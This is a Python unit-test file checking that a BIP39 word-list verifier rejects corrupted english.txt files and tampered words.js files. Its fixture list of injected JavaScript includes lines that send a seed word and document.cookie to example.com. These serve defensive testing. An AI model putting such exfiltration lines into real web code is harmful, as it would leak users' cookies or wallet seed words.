#!/usr/bin/env python3
"""test_bip39.py - negative and fuzz tests for verify_bip39.py.

Run: python test_bip39.py    (exit code 0 means every test passed)

The point of these tests is the negative cases. A verifier that only passes the
happy path proves nothing; every test here either corrupts the word list or
smuggles code into words.js and asserts that verification fails cleanly.

Standard library only: hashlib, shutil, sys, tempfile, unittest, pathlib.
"""

import hashlib
import shutil
import sys
import tempfile
import unittest
from pathlib import Path

# Importing the verifier would otherwise leave a __pycache__ folder in the repo.
# The setting must stay above the import, because it only affects later imports.
sys.dont_write_bytecode = True

import verify_bip39 as verify

REPO_ROOT = Path(__file__).resolve().parent
ENGLISH_BYTES = (REPO_ROOT / verify.ENGLISH_TXT_NAME).read_bytes()
WORDS_JS_BYTES = (REPO_ROOT / verify.WORDS_JS_NAME).read_bytes()

# Code an attacker (or a careless maintainer) might try to append to words.js.
MALICIOUS_SUFFIXES = [
    "\nconsole.log('injected');",
    "\nalert(1);",
    "\nfetch('https://example.com/?w=' + EMBEDDED_WORDS[0]);",
    "\n/* injected comment */",
    "\nwindow.report = function () {};",
    "\nEMBEDDED_WORDS.reverse();",
    "\nnew Image().src = 'https://example.com/?data=' + document.cookie;",
]

# Code that might be prepended so the array is no longer the first statement.
MALICIOUS_PREFIXES = [
    "/* prepended comment */\n",
    "window.evil = 1;\n",
    "if (true) { console.log('hi'); }\n",
    "const EXTRA = ['abandon'];\n",
]


def make_workspace() -> Path:
    """A throwaway copy of english.txt and words.js."""
    directory = Path(tempfile.mkdtemp(prefix="bip39_test_"))
    shutil.copyfile(REPO_ROOT / verify.ENGLISH_TXT_NAME, directory / verify.ENGLISH_TXT_NAME)
    shutil.copyfile(REPO_ROOT / verify.WORDS_JS_NAME, directory / verify.WORDS_JS_NAME)
    return directory


class WorkspaceTestCase(unittest.TestCase):
    """Each test gets its own directory, so tests cannot affect each other."""

    def setUp(self):
        self.root = make_workspace()
        self.addCleanup(shutil.rmtree, self.root, ignore_errors=True)

    @property
    def english_path(self) -> Path:
        return self.root / verify.ENGLISH_TXT_NAME

    @property
    def words_js_path(self) -> Path:
        return self.root / verify.WORDS_JS_NAME

    def run_verify(self) -> int:
        return verify.verify(root_dir=self.root, verbose=False)

    def write_english(self, text: str, newline: str = "\n") -> None:
        with open(self.english_path, "w", encoding="utf-8", newline=newline) as handle:
            handle.write(text)

    def write_words_js(self, text: str) -> None:
        with open(self.words_js_path, "w", encoding="utf-8", newline="\n") as handle:
            handle.write(text)

    def english_text(self) -> str:
        return ENGLISH_BYTES.decode("utf-8")


class TestRepositoryFixtures(unittest.TestCase):
    """The shipped files must be canonical, or every other test is meaningless."""

    def test_repository_verifies(self):
        self.assertEqual(verify.verify(root_dir=REPO_ROOT, verbose=False), 0)

    def test_english_txt_is_byte_identical_to_upstream(self):
        self.assertEqual(len(ENGLISH_BYTES), 13116)
        self.assertEqual(hashlib.sha256(ENGLISH_BYTES).hexdigest(), verify.CANONICAL_SHA256)
        self.assertNotIn(b"\r", ENGLISH_BYTES, "english.txt must use LF line endings")

    def test_words_js_has_no_carriage_returns(self):
        self.assertNotIn(b"\r", WORDS_JS_BYTES)

    def test_words_js_is_one_statement(self):
        text = WORDS_JS_BYTES.decode("utf-8")
        self.assertTrue(text.startswith(verify.WORDS_JS_PREFIX))
        self.assertTrue(text.rstrip("\n").endswith(verify.WORDS_JS_SUFFIX))

    def test_word_list_content(self):
        words = verify.normalize_words(ENGLISH_BYTES)
        self.assertEqual(len(words), 2048)
        self.assertEqual(len(set(words)), 2048)
        self.assertEqual(words, sorted(words))
        self.assertEqual(verify.compute_hash(words), verify.CANONICAL_SHA256)

    def test_every_word_has_a_unique_four_letter_prefix(self):
        # The UI highlights the first 4 letters because they identify a tablet
        # unambiguously. If that ever stops being true, the UI hint is wrong.
        words = verify.normalize_words(ENGLISH_BYTES)
        self.assertEqual(len({word[:4] for word in words}), 2048)


class TestEnglishTxt(WorkspaceTestCase):
    """english.txt corruption must always be caught."""

    def test_clean_copy_passes(self):
        self.assertEqual(self.run_verify(), 0)

    def test_missing_english_txt_fails(self):
        self.english_path.unlink()
        self.assertEqual(self.run_verify(), 1)

    def test_missing_words_js_fails(self):
        self.words_js_path.unlink()
        self.assertEqual(self.run_verify(), 1)

    def test_truncated_file_fails(self):
        self.write_english(self.english_text()[:9000])
        self.assertEqual(self.run_verify(), 1)

    def test_extra_word_in_list_fails(self):
        # This test used to sit after unittest.main() and never ran.
        self.write_english(self.english_text() + "abandon\n")
        self.assertEqual(self.run_verify(), 1)

    def test_single_word_changed_fails(self):
        self.write_english(self.english_text().replace("zoo\n", "zoom\n"))
        self.assertEqual(self.run_verify(), 1)

    def test_transposed_words_fail(self):
        lines = self.english_text().split("\n")
        lines[0], lines[1] = lines[1], lines[0]
        self.write_english("\n".join(lines))
        self.assertEqual(self.run_verify(), 1)

    def test_duplicate_word_fails(self):
        lines = self.english_text().split("\n")
        lines[1] = lines[0]
        self.write_english("\n".join(lines))
        self.assertEqual(self.run_verify(), 1)

    def test_crlf_line_endings_fail_but_are_explained(self):
        self.write_english(self.english_text(), newline="\r\n")
        self.assertEqual(self.run_verify(), 1)
        # The words are still right; only the bytes changed. The verifier must
        # say so rather than claim the list itself is corrupt.
        self.assertEqual(
            verify.compute_hash(verify.normalize_words(self.english_path.read_bytes())),
            verify.CANONICAL_SHA256,
        )

    def test_byte_order_mark_fails(self):
        self.english_path.write_bytes(b"\xef\xbb\xbf" + ENGLISH_BYTES)
        self.assertEqual(self.run_verify(), 1)

    def test_extra_blank_line_fails(self):
        self.write_english(self.english_text() + "\n")
        self.assertEqual(self.run_verify(), 1)

    def test_extra_spaces_fail(self):
        self.write_english(self.english_text().replace("abandon\n", " abandon\n", 1))
        self.assertEqual(self.run_verify(), 1)

    def test_binary_garbage_fails_cleanly(self):
        self.english_path.write_bytes(bytes(range(256)) * 40)
        self.assertEqual(self.run_verify(), 1)

    def test_invalid_utf8_fails_cleanly(self):
        self.english_path.write_bytes(b"abandon\n\xff\xfe\x00ability\n")
        self.assertEqual(self.run_verify(), 1)

    def test_empty_file_fails(self):
        self.write_english("")
        self.assertEqual(self.run_verify(), 1)


class TestWordsJs(WorkspaceTestCase):
    """words.js must be exactly one generated statement - nothing more."""

    def test_clean_copy_passes(self):
        self.assertEqual(self.run_verify(), 0)

    def test_trailing_newlines_are_allowed(self):
        self.write_words_js(WORDS_JS_BYTES.decode("utf-8") + "\n\n")
        self.assertEqual(self.run_verify(), 0)

    def test_crlf_words_js_passes(self):
        self.write_words_js(WORDS_JS_BYTES.decode("utf-8").replace("\n", "\r\n"))
        self.assertEqual(self.run_verify(), 0)

    def test_appended_javascript_is_rejected(self):
        self.write_words_js(WORDS_JS_BYTES.decode("utf-8") + "\nconsole.log('injected');\n")
        self.assertEqual(self.run_verify(), 1)

    def test_malicious_suffixes_are_rejected(self):
        words_js = WORDS_JS_BYTES.decode("utf-8")
        for suffix in MALICIOUS_SUFFIXES:
            with self.subTest(suffix=suffix):
                self.write_words_js(words_js + suffix)
                self.assertEqual(self.run_verify(), 1)

    def test_malicious_prefixes_are_rejected(self):
        words_js = WORDS_JS_BYTES.decode("utf-8")
        for prefix in MALICIOUS_PREFIXES:
            with self.subTest(prefix=prefix):
                self.write_words_js(prefix + words_js)
                self.assertEqual(self.run_verify(), 1)

    def test_missing_semicolon_is_rejected(self):
        words_js = WORDS_JS_BYTES.decode("utf-8").rstrip("\n")
        self.write_words_js(words_js[:-1] + "\n")
        self.assertEqual(self.run_verify(), 1)

    def test_single_quotes_are_rejected(self):
        words = verify.normalize_words(ENGLISH_BYTES)
        body = ", ".join("'%s'" % word for word in words)
        self.write_words_js("%s[%s];\n" % (verify.WORDS_JS_PREFIX, body))
        self.assertEqual(self.run_verify(), 1)

    def test_non_string_entry_is_rejected_cleanly(self):
        self.write_words_js('const EMBEDDED_WORDS = ["abandon", 2048];\n')
        self.assertEqual(self.run_verify(), 1)

    def test_empty_array_is_rejected(self):
        self.write_words_js("const EMBEDDED_WORDS = [];\n")
        self.assertEqual(self.run_verify(), 1)

    def test_malformed_json_is_rejected(self):
        self.write_words_js('const EMBEDDED_WORDS = ["abandon", "ability",];\n')
        self.assertEqual(self.run_verify(), 1)

    def test_short_list_is_rejected(self):
        words = verify.normalize_words(ENGLISH_BYTES)[:2047]
        self.write_words_js(verify.render_words_js(words))
        self.assertEqual(self.run_verify(), 1)

    def test_extra_word_is_rejected(self):
        words = verify.normalize_words(ENGLISH_BYTES) + ["abandon"]
        self.write_words_js(verify.render_words_js(words))
        self.assertEqual(self.run_verify(), 1)

    def test_desynchronized_word_is_rejected(self):
        words = verify.normalize_words(ENGLISH_BYTES)
        words[1234] = "zebra"
        self.write_words_js(verify.render_words_js(words))
        self.assertEqual(self.run_verify(), 1)

    def test_commented_out_array_is_rejected(self):
        self.write_words_js("// " + WORDS_JS_BYTES.decode("utf-8"))
        self.assertEqual(self.run_verify(), 1)


class TestHashAndGeneration(unittest.TestCase):
    """The hash helpers and the words.js generator must be trustworthy too."""

    def test_sha256_published_test_vectors(self):
        vectors = {
            "": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "abc": "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
            "abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq":
                "248d6a61d20638b8e5c026930c3e6039a33ce45964ff2167f6ecedd419db06c1",
        }
        for text, expected in vectors.items():
            with self.subTest(text=text):
                self.assertEqual(verify.sha256_hex(text), expected)

    def test_compute_hash_matches_canonical(self):
        words = verify.normalize_words(ENGLISH_BYTES)
        self.assertEqual(verify.compute_hash(words), verify.CANONICAL_SHA256)

    def test_render_and_parse_round_trip(self):
        words = verify.normalize_words(ENGLISH_BYTES)
        rendered = verify.render_words_js(words)
        self.assertEqual(verify.parse_words_js(rendered.encode("utf-8")), words)

    def test_parse_words_js_rejects_non_json(self):
        with self.assertRaises(verify.WordListError):
            verify.parse_words_js(b"const EMBEDDED_WORDS = [oops];")

    def test_write_words_js_regenerates_identical_file(self):
        root = make_workspace()
        self.addCleanup(shutil.rmtree, root, ignore_errors=True)
        (root / verify.WORDS_JS_NAME).unlink()

        self.assertEqual(verify.write_words_js(root, verbose=False), 0)
        self.assertEqual((root / verify.WORDS_JS_NAME).read_bytes(), WORDS_JS_BYTES)
        self.assertEqual(verify.verify(root_dir=root, verbose=False), 0)

    def test_write_words_js_refuses_tampered_list(self):
        root = make_workspace()
        self.addCleanup(shutil.rmtree, root, ignore_errors=True)
        (root / verify.WORDS_JS_NAME).unlink()

        english_path = root / verify.ENGLISH_TXT_NAME
        english_path.write_text(
            english_path.read_text(encoding="utf-8").replace("zoo", "zoom"),
            encoding="utf-8",
        )

        self.assertEqual(verify.write_words_js(root, verbose=False), 1)
        self.assertFalse((root / verify.WORDS_JS_NAME).exists())


if __name__ == "__main__":
    unittest.main(verbosity=2)

